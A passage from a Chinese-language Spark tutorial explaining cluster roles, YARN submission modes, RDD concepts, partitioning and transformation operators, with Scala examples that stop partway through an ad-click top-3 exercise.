的结构。如下图所示，它展示了一个 Spark 执行时的基本结构。图形中的Driver 表示 master，负责管理整个集群中的作业任务调度。图形中的Executor 则是 slave，负责实际执行任务</p><p><img src="http://qnypic.shawncoding.top/blog/202402291816075.png" alt></p><h3 id="3-2-核心组件">3.2 核心组件</h3><p><strong>Driver</strong></p><p>Spark 驱动器节点，用于执行 Spark 任务中的 main 方法，负责实际代码的执行工作。Driver 在Spark 作业执行时主要负责：</p><ul><li>将用户程序转化为作业（job）</li><li>在 Executor 之间调度任务(task)</li><li>跟踪Executor 的执行情况</li><li>通过UI 展示查询运行情况</li></ul><p>实际上，我们无法准确地描述Driver 的定义，因为在整个的编程过程中没有看到任何有关Driver 的字眼。所以简单理解，所谓的 Driver 就是驱使整个应用运行起来的程序，也称之为Driver 类。</p><p><strong>Executor</strong></p><p>Spark Executor 是集群中工作节点（Worker）中的一个 JVM 进程，负责在 Spark 作业中运行具体任务（Task），任务彼此之间相互独立。Spark 应用启动时，Executor 节点被同时启动，并且始终伴随着整个 Spark 应用的生命周期而存在。如果有Executor 节点发生了故障或崩溃，Spark 应用也可以继续执行，会将出错节点上的任务调度到其他 Executor 节点上继续运行。Executor 有两个核心功能：</p><ul><li>负责运行组成 Spark 应用的任务，并将结果返回给驱动器进程</li><li>它们通过自身的块管理器（Block Manager）为用户程序中要求缓存的 RDD 提供内存式存储。RDD 是直接缓存在 Executor 进程内的，因此任务可以在运行时充分利用缓存数据加速运算</li></ul><p><strong>Master</strong> <strong>&amp;</strong> <strong>Worker</strong></p><p>Spark 集群的独立部署环境中，不需要依赖其他的资源调度框架，自身就实现了资源调度的功能，所以环境中还有其他两个核心组件：Master 和 Worker，这里的 Master 是一个进程，主要负责资源的调度和分配，并进行集群的监控等职责，类似于 Yarn 环境中的 RM, 而Worker 呢，也是进程，一个 Worker 运行在集群中的一台服务器上，由 Master 分配资源对数据进行并行的处理和计算，类似于 Yarn 环境中 NM。</p><p><strong>ApplicationMaster</strong></p><p>Hadoop 用户向 YARN 集群提交应用程序时,提交程序中应该包ApplicationMaster，用于向资源调度器申请执行任务的资源容器 Container，运行用户自己的程序任务 job，监控整个任务的执行，跟踪整个任务的状态，处理任务失败等异常情况。说的简单点就是，ResourceManager（资源）和Driver（计算）之间的解耦合靠的就是ApplicationMaster</p><h3 id="3-3-核心概念">3.3 核心概念</h3><p>Spark Executor 是集群中运行在工作节点（Worker）中的一个 JVM 进程，是整个集群中的专门用于计算的节点。在提交应用中，可以提供参数指定计算节点的个数，以及对应的资源。这里的资源一般指的是工作节点 Executor 的内存大小和使用的虚拟 CPU 核（Core）数量</p><table><thead><tr><th><strong>名称</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>–num-executors</td><td>配置 Executor 的数量</td></tr><tr><td>–executor-memory</td><td>配置每个 Executor 的内存大小</td></tr><tr><td>–executor-cores</td><td>配置每个 Executor 的虚拟 CPU core 数量</td></tr></tbody></table><p>在分布式计算框架中一般都是多个任务同时执行，由于任务分布在不同的计算节点进行计算，所以能够真正地实现多任务并行执行，记住，这里是并行，而不是并发。这里我们<strong>将整个集群并行执行任务的数量称之为并行度</strong>。</p><p>针对<strong>有向无环图（ DAG）</strong>，是由 Spark 程序直接映射成的数据流的高级抽象模型</p><h3 id="3-4-提交流程">3.4 提交流程</h3><p>开发人员根据需求写的应用程序通过 Spark 客户端提交给 Spark 运行环境执行计算的流程。在不同的部署环境中，这个提交过程基本相同，但是又有细微的区别，Spark 应用程序提交到 Yarn 环境中执行的时候，一般会有两种部署执行的方式：Client 和 Cluster。<strong>两种模式主要区别在于：Driver 程序的运行节点位置</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202402291816201.png" alt></p><p><strong>Yarn Client 模式</strong></p><p>Client 模式将用于监控和调度的Driver 模块在客户端执行，而不是在 Yarn 中，所以一般用于测试</p><ul><li>Driver 在任务提交的本地机器上运行</li><li>Driver 启动后会和ResourceManager 通讯申请启动ApplicationMaster</li><li>ResourceManager 分配 container，在合适的NodeManager 上启动ApplicationMaster，负责向ResourceManager 申请 Executor 内存</li><li>ResourceManager 接到 ApplicationMaster 的资源申请后会分配 container，然后ApplicationMaster 在资源分配指定的NodeManager 上启动 Executor 进程</li><li>Executor 进程启动后会向Driver 反向注册，Executor 全部注册完成后Driver 开始执行main 函数</li><li>之后执行到 Action 算子时，触发一个 Job，并根据宽依赖开始划分 stage，每个stage 生成对应的TaskSet，之后将 task 分发到各个Executor 上执行</li></ul><p><strong>Yarn Cluster 模式(重要)</strong></p><p>Cluster 模式将用于监控和调度的 Driver 模块启动在Yarn 集群资源中执行。一般应用于实际生产环境</p><ul><li>在 YARN Cluster 模式下，任务提交后会和ResourceManager 通讯申请启动ApplicationMaster</li><li>随后ResourceManager 分配 container，在合适的 NodeManager 上启动 ApplicationMaster，此时的 ApplicationMaster 就是Driver</li><li>Driver 启动后向 ResourceManager 申请Executor 内存，ResourceManager 接到ApplicationMaster 的资源申请后会分配container，然后在合适的NodeManager 上启动Executor 进程</li><li>Executor 进程启动后会向Driver 反向注册，Executor 全部注册完成后Driver 开始执行main 函数，</li><li>之后执行到 Action 算子时，触发一个 Job，并根据宽依赖开始划分 stage，每个stage 生成对应的TaskSet，之后将 task 分发到各个Executor 上执行</li></ul><h1>二、Spark核心编程(Core)</h1><h2 id="1、概述">1、概述</h2><p>Spark 计算框架为了能够进行高并发和高吞吐的数据处理，封装了三大数据结构，用于处理不同的应用场景。三大数据结构分别是：</p><ul><li>RDD : 弹性分布式数据集</li><li>累加器：分布式共享只写变量</li><li>广播变量：分布式共享只读变量</li></ul><h2 id="2、RDD详解">2、RDD详解</h2><h3 id="2-1-RDD概述">2.1 RDD概述</h3><p>RDD（Resilient Distributed Dataset） 提供了一个抽象的数据模型，让我们不必担心底层数据的分布式特性，只需将具体的应用逻辑表达为一系列转换操作(函数)，不同 RDD 之间的转换操作之间还可以形成依赖关系，进而实现管道化，从而避免了中间结果的存储，大大降低了数据复制、磁盘 IO 和序列化开销，并且还提供了更多的 API(map/reduec/filter/groupBy)</p><p>RDD叫做弹性分布式数据集，是 Spark 中最基本的数据处理模型。代码中是一个抽象类，它代表一个弹性的、不可变、可分区、里面的元素可并行计算的集合。</p><ul><li>弹性<ul><li>存储的弹性：内存与磁盘的自动切换；</li><li>容错的弹性：数据丢失可以自动恢复；</li><li>计算的弹性：计算出错重试机制；</li><li>分片的弹性：可根据需要重新分片。</li></ul></li><li>分布式：数据存储在大数据集群不同节点上</li><li>数据集：RDD 封装了计算逻辑，并不保存数据</li><li>数据抽象：RDD 是一个抽象类，需要子类具体实现</li><li>不可变：RDD 封装了计算逻辑，是不可以改变的，想要改变，只能产生新的RDD，在新的RDD 里面封装计算逻辑</li><li>可分区、并行计算</li></ul><h3 id="2-2-RDD主要属性">2.2 RDD主要属性</h3><p>在源码中可以看到有对 RDD 介绍的注释</p><ul><li><em>A list of partitions</em> ： 一组分片(Partition)/一个分区(Partition)列表，即数据集的基本组成单位。 对于 RDD 来说，每个分片都会被一个计算任务处理，分片数决定并行度。 用户可以在创建 RDD 时指定 RDD 的分片个数，如果没有指定，那么就会采用默认值</li><li><em>A function for computing each split</em> ： 一个函数会被作用在每一个分区。 Spark 中 RDD 的计算是以分片为单位的，compute 函数会被作用到每个分区上</li><li><em>A list of dependencies on other RDDs</em> ： 一个 RDD 会依赖于其他多个 RDD。 RDD 的每次转换都会生成一个新的 RDD，所以 RDD 之间就会形成类似于流水线一样的前后依赖关系。在部分分区数据丢失时，Spark 可以通过这个依赖关系重新计算丢失的分区数据，而不是对 RDD 的所有分区进行重新计算。(Spark 的容错机制)</li><li><em>Optionally, a Partitioner for key-value RDDs (e.g. to say that the RDD is hash-partitioned)</em>： 可选项，对于 KV 类型的 RDD 会有一个 Partitioner，即 RDD 的分区函数，默认为 HashPartitioner。</li><li><em>Optionally, a list of preferred locations to compute each split on (e.g. block locations for an HDFS file)</em>： 可选项,一个列表，存储存取每个 Partition 的优先位置(preferred location)。 对于一个 HDFS 文件来说，这个列表保存的就是每个 Partition 所在的块的位置。按照&quot;移动数据不如移动计算&quot;的理念，Spark 在进行任务调度的时候，会尽可能选择那些存有数据的 worker 节点来进行任务计算。</li></ul><h3 id="2-3-执行原理">2.3 执行原理</h3><p>Spark 框架在执行时，先申请资源，然后将应用程序的数据处理逻辑分解成一个一个的计算任务。然后将任务发到已经分配资源的计算节点上, 按照指定的计算模型进行数据计算。最后得到计算结果。RDD 是 Spark 框架中用于数据处理的核心模型，接下来看看在 Yarn 环境中RDD 的工作原理:</p><ul><li>启动 Yarn 集群环境</li><li>Spark 通过申请资源创建调度节点和计算节点</li><li>Spark 框架根据需求将计算逻辑根据分区划分成不同的任务</li><li>调度节点将任务根据计算节点状态发送到对应的计算节点进行计算</li></ul><p>RDD 在整个流程中主要用于将逻辑进行封装，并生成 Task 发送给Executor 节点执行计算</p><h2 id="3、RDD-API">3、RDD-API</h2><h3 id="3-1-RDD-的创建方式">3.1 RDD 的创建方式</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// =================1)从集合（内存）中创建 RDD========</span></span><br><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从内存中创建RDD，将内存中集合的数据作为处理的数据源</span></span><br><span class="line"><span class="keyword">val</span> seq = <span class="type">Seq</span>[<span class="type">Int</span>](<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">// parallelize : 并行</span></span><br><span class="line"><span class="comment">//val rdd: RDD[Int] = sc.parallelize(seq)</span></span><br><span class="line"><span class="comment">// makeRDD方法在底层实现时其实就是调用了rdd对象的parallelize方法。</span></span><br><span class="line"><span class="keyword">val</span> rdd: <span class="type">RDD</span>[<span class="type">Int</span>] = sc.makeRDD(seq)</span><br><span class="line">rdd.collect().foreach(println)</span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================2)从外部存储（文件）创建RDD=========</span></span><br><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 创建RDD</span></span><br><span class="line"><span class="comment">// 从文件中创建RDD，将文件中的数据作为处理的数据源</span></span><br><span class="line"><span class="comment">// path路径默认以当前环境的根路径为基准。可以写绝对路径，也可以写相对路径</span></span><br><span class="line"><span class="comment">//sc.textFile("D:\\mineworkspace\\idea\\classes\\atguigu-classes\\datas\\1.txt")</span></span><br><span class="line"><span class="comment">//val rdd: RDD[String] = sc.textFile("datas/1.txt")</span></span><br><span class="line"><span class="comment">// path路径可以是文件的具体路径，也可以目录名称</span></span><br><span class="line"><span class="comment">//val rdd = sc.textFile("datas")</span></span><br><span class="line"><span class="comment">// path路径还可以使用通配符 *</span></span><br><span class="line"><span class="comment">//val rdd = sc.textFile("datas/1*.txt")</span></span><br><span class="line"><span class="comment">// 读取的结果表示为元组，第一个元素表示文件路径，第二个元素表示文件内容</span></span><br><span class="line"><span class="comment">// val rdd = sc.wholeTextFiles("datas")</span></span><br><span class="line"><span class="comment">// path还可以是分布式存储系统路径：HDFS</span></span><br><span class="line"><span class="keyword">val</span> rdd = sc.textFile(<span class="string">"hdfs://hadoop102:8020/test.txt"</span>)</span><br><span class="line">rdd.collect().foreach(println)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==============3)从其他 RDD 创建=========</span></span><br><span class="line"><span class="comment">//主要是通过一个RDD 运算完后，再产生新的RDD</span></span><br><span class="line"><span class="comment">// ===============直接创建 RDD（new）=========</span></span><br><span class="line"><span class="comment">// 使用 new 的方式直接构造RDD，一般由Spark 框架自身使用</span></span><br></pre></td></tr></table></figure><h3 id="3-2-RDD-并行度与分区">3.2 RDD 并行度与分区</h3><p>默认情况下，Spark 可以将一个作业切分多个任务后，发送给 Executor 节点并行计算，而能够并行计算的任务数量我们称之为并行度。这个数量可以在构建RDD 时指定</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO 准备环境</span></span><br><span class="line"><span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"RDD"</span>)</span><br><span class="line">sparkConf.set(<span class="string">"spark.default.parallelism"</span>, <span class="string">"5"</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 创建RDD</span></span><br><span class="line"><span class="comment">// RDD的并行度 &amp; 分区</span></span><br><span class="line"><span class="comment">// makeRDD方法可以传递第二个参数，这个参数表示分区的数量</span></span><br><span class="line"><span class="comment">// 第二个参数可以不传递的，那么makeRDD方法会使用默认值 ： defaultParallelism（默认并行度）</span></span><br><span class="line"><span class="comment">//     scheduler.conf.getInt("spark.default.parallelism", totalCores)</span></span><br><span class="line"><span class="comment">//    spark在默认情况下，从配置对象中获取配置参数：spark.default.parallelism</span></span><br><span class="line"><span class="comment">//    如果获取不到，那么使用totalCores属性，这个属性取值为当前运行环境的最大可用核数</span></span><br><span class="line"><span class="comment">//val rdd = sc.makeRDD(List(1,2,3,4),2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Spark读取文件，底层其实使用的就是Hadoop的读取方式</span></span><br><span class="line"><span class="comment">// 分区数量的计算方式：</span></span><br><span class="line"><span class="comment">//    totalSize = 7</span></span><br><span class="line"><span class="comment">//    goalSize =  7 / 2 = 3（byte）</span></span><br><span class="line"><span class="comment">//    7 / 3 = 2...1 (1.1) + 1 = 3(分区)</span></span><br><span class="line"><span class="comment">// 1. 数据以行为单位进行读取</span></span><br><span class="line"><span class="comment">//    spark读取文件，采用的是hadoop的方式读取，所以一行一行读取，和字节数没有关系</span></span><br><span class="line"><span class="comment">// 2. 数据读取时以偏移量为单位,偏移量不会被重复读取</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   1@@   =&gt; 012</span></span><br><span class="line"><span class="comment">   2@@   =&gt; 345</span></span><br><span class="line"><span class="comment">   3     =&gt; 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 3. 数据分区的偏移量范围的计算</span></span><br><span class="line"><span class="comment">// 0 =&gt; [0, 3]  =&gt; 12</span></span><br><span class="line"><span class="comment">// 1 =&gt; [3, 6]  =&gt; 3</span></span><br><span class="line"><span class="comment">// 2 =&gt; [6, 7]  =&gt;</span></span><br><span class="line"><span class="comment">// val rdd = sc.textFile("datas/1.txt", 2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将处理的数据保存成分区文件</span></span><br><span class="line">rdd.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 关闭环境</span></span><br><span class="line">sc.stop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// =======================================</span></span><br><span class="line"><span class="comment">// 读取内存数据时，数据可以按照并行度的设定进行数据的分区操作，数据分区规则的Spark 核心源码如下</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">positions</span></span>(length: <span class="type">Long</span>, numSlices: <span class="type">Int</span>): <span class="type">Iterator</span>[(<span class="type">Int</span>, <span class="type">Int</span>)] = &#123;</span><br><span class="line"> (<span class="number">0</span> until numSlices).iterator.map &#123; i =&gt;</span><br><span class="line"> <span class="keyword">val</span> start = ((i * length) / numSlices).toInt</span><br><span class="line"> <span class="keyword">val</span> end = (((i + <span class="number">1</span>) * length) / numSlices).toInt</span><br><span class="line"> (start, end)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================================</span></span><br><span class="line"><span class="comment">// 读取文本时的分类规则，和内存有所不同</span></span><br><span class="line">public <span class="type">InputSplit</span>[] getSplits(<span class="type">JobConf</span> job, int numSplits)</span><br><span class="line">    <span class="keyword">throws</span> <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    long totalSize = <span class="number">0</span>;                           <span class="comment">// compute total size</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">FileStatus</span> file: files) &#123;                <span class="comment">// check we have valid files</span></span><br><span class="line">      <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IOException</span>(<span class="string">"Not a file: "</span>+ file.getPath());</span><br><span class="line">      &#125;</span><br><span class="line">      totalSize += file.getLen();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    long goalSize = totalSize / (numSplits == <span class="number">0</span> ? <span class="number">1</span> : numSplits);</span><br><span class="line">    long minSize = <span class="type">Math</span>.max(job.getLong(org.apache.hadoop.mapreduce.lib.input.</span><br><span class="line">      <span class="type">FileInputFormat</span>.<span class="type">SPLIT_MINSIZE</span>, <span class="number">1</span>), minSplitSize);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">FileStatus</span> file: files) &#123;</span><br><span class="line">      ...</span><br><span class="line">        <span class="keyword">if</span> (isSplitable(fs, path)) &#123;</span><br><span class="line">          long blockSize = file.getBlockSize();</span><br><span class="line">          long splitSize = computeSplitSize(goalSize, minSize, blockSize);</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> long computeSplitSize(long goalSize, long minSize,long blockSize) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">Math</span>.max(minSize, <span class="type">Math</span>.min(goalSize, blockSize));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-RDD-转换算子">3.3 RDD 转换算子</h3><p>RDD 的算子分为两类:</p><ul><li>Transformation_转换操作:<strong>返回一个新的 RDD</strong></li><li>Action动作操作:<strong>返回值不是 RDD(无返回值或返回其他的)</strong></li></ul><blockquote><p>❣️ 注意:<br>1、RDD 不实际存储真正要计算的数据，而是记录了数据的位置在哪里，数据的转换关系(调用了什么方法，传入什么函数)。<br>2、RDD 中的所有转换都是惰性求值/延迟执行的，也就是说并不会直接计算。只有当发生一个要求返回结果给 Driver 的 Action 动作时，这些转换才会真正运行。<br>3、之所以使用惰性求值/延迟执行，是因为这样可以在 Action 时对 RDD 操作形成 DAG 有向无环图进行 Stage 的划分和并行优化，这种设计让 Spark 更加有效率地运行。</p></blockquote><p><strong>Transformation 转换算子</strong></p><table><thead><tr><th><strong>转换算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td><strong>map</strong>(func)</td><td>返回一个新的 RDD，该 RDD 由每一个输入元素经过 func 函数转换后组成</td></tr><tr><td><strong>filter</strong>(func)</td><td>返回一个新的 RDD，该 RDD 由经过 func 函数计算后返回值为 true 的输入元素组成；;当数据进行筛选过滤后，分区不变，但是分区内的数据可能不均衡，生产环境下，可能会出现数据倾斜</td></tr><tr><td><strong>flatMap</strong>(func)</td><td>类似于 map，但是每一个输入元素可以被映射为 0 或多个输出元素(所以 func 应该返回一个序列，而不是单一元素，)</td></tr><tr><td><strong>mapPartitions</strong>(func)</td><td>类似于 map，但独立地在 RDD 的每一个分片上运行，因此在类型为 T 的 RDD 上运行时，func 的函数类型必须是 Iterator[T] =&gt; Iterator[U]，性能高但容易内存溢出，内存少用map</td></tr><tr><td><strong>mapPartitionsWithIndex</strong>(func)</td><td>类似于 mapPartitions，但 func 带有一个整数参数表示分片的索引值，因此在类型为 T 的 RDD 上运行时，func 的函数类型必须是(Int, Interator[T]) =&gt; Iterator[U]</td></tr><tr><td>glom(func)</td><td>将同一个分区的数据直接转换为相同类型的内存数组进行处理，分区不变</td></tr><tr><td>groupBy(func)</td><td>将数据根据指定的规则进行分组, 分区默认不变，但是数据会被打乱重新组合，我们将这样的操作称之为 shuffle。 groupBy[K](f: T =&gt; K)</td></tr><tr><td>sample(withReplacement, fraction, seed)</td><td>根据 fraction 指定的比例对数据进行采样，可以选择是否使用随机数进行替换，seed 用于指定随机数生成器种子</td></tr><tr><td><strong>union</strong>(otherDataset)</td><td>对源 RDD 和参数 RDD 求并集后返回一个新的 RDD</td></tr><tr><td>intersection(otherDataset)</td><td>对源 RDD 和参数 RDD 求交集后返回一个新的 RDD；subtract为差集；zip为拉链；sliding为滑窗</td></tr><tr><td><strong>distinct</strong>([numTasks]))</td><td>对源 RDD 进行去重后返回一个新的 RDD</td></tr><tr><td>partitionBy(partitioner)</td><td>将数据按照指定 Partitioner 重新进行分区。Spark 默认的分区器是 HashPartitioner</td></tr><tr><td><strong>groupByKey</strong>([numTasks])</td><td>在一个(K,V)的 RDD 上调用,将数据源的数据根据 key 对 value 进行分组(相同的key把value放一起，group by的话还是会包括key,value)，返回一个(K, Iterator[V])的 RDD，推荐使用</td></tr><tr><td><strong>reduceByKey</strong>(func, [numTasks])</td><td>在一个(K,V)的 RDD 上调用，返回一个(K,V)的 RDD，使用指定的 reduce 函数，将相同 key 的值聚合到一起，与 groupByKey 类似，reduce 任务的个数可以通过第二个可选的参数来设置(有效减少落盘)</td></tr><tr><td>aggregateByKey(zeroValue)(seqOp, combOp, [numTasks])</td><td>对 PairRDD 中相同的 Key 值进行聚合操作，在聚合过程中同样使用了一个中立的初始值。和 aggregate 函数类似，aggregateByKey 返回值的类型不需要和 RDD 中 value 的类型一致(第一个函数是分区内，第二个是分区间)</td></tr><tr><td>foldByKey(zeroValue)(func)</td><td>当分区内计算规则和分区间计算规则相同时，aggregateByKey 就可以简化为 foldByKey</td></tr><tr><td><strong>combineByKey</strong>(func1,func2,func3)</td><td>最通用的对 key-value 型 rdd 进行聚集操作的聚集函（aggregation function）。类似于aggregate()，combineByKey()允许用户返回值的类型与输入不一致。参数一将相同key的第一个数据进行结构的转换实现操作，参数二表示分区内的计算规则，参数三表示分区间的计算规则;上面几个底层调用都是这个函数</td></tr><tr><td><strong>sortByKey</strong>([ascending], [numTasks])</td><td>在一个(K,V)的 RDD 上调用，K 必须实现 Ordered 接口，返回一个按照 key 进行排序的(K,V)的 RDD</td></tr><tr><td>sortBy(func,[ascending], [numTasks])</td><td>与 sortByKey 类似，但是更灵活，存在shuffle，默认为升序排列。排序后新产生的 RDD 的分区数与原 RDD 的分区数一致</td></tr><tr><td><strong>join</strong>(otherDataset, [numTasks])</td><td>在类型为(K,V)和(K,W)的 RDD 上调用，返回一个相同 key 对应的所有元素对在一起的(K,(V,W))的 RDD，还有leftOuterJoin函数</td></tr><tr><td>cogroup(otherDataset, [numTasks])</td><td>在类型为(K,V)和(K,W)的 RDD 上调用，返回一个(K,(Iterable,Iterable))类型的 RDD</td></tr><tr><td>cartesian(otherDataset)</td><td>笛卡尔积</td></tr><tr><td>pipe(command, [envVars])</td><td>对 rdd 进行管道操作</td></tr><tr><td><strong>coalesce</strong>(numPartitions,isShuffle)</td><td>减少 RDD 的分区数到指定值。在过滤大量数据之后，可以执行此操作，默认是不shuffle</td></tr><tr><td><strong>repartition</strong>(numPartitions)</td><td>重新给 RDD 分区，一般用来扩大分区</td></tr></tbody></table><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个举例，统计出每一个省份每个广告被点击数量排行的 Top3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"Operator"</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 案例实操</span></span><br><span class="line">    <span class="comment">// 1. 获取原始数据：时间戳，省份，城市，用户，广告</span></span><br><span class="line">    <span class="keyword">val</span> dataRDD = sc.textFile(<span class="string">"datas/agent.log"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 将原始数据进行结构的转换。方便统计</span></span><br><span class="line">    <span class="comment">//    时间戳，省份，城市，用户，广告</span></span><br><span class="line">    <span class="comment">//    =&gt;</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), 1 )</span></span><br><span class="line">    <span class="keyword">val</span> mapRDD = dataRDD.map(</span><br><span class="line">        line =&gt; &#123;</span><br><span class="line">            <span class="keyword">val</span> datas = line.split(<span class="string">" "</span>)</span><br><span class="line">            (( datas(<span class="number">1</span>), datas(<span class="number">4</span>) ), <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将转换结构后的数据，进行分组聚合</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), 1 ) =&gt; ( ( 省份，广告 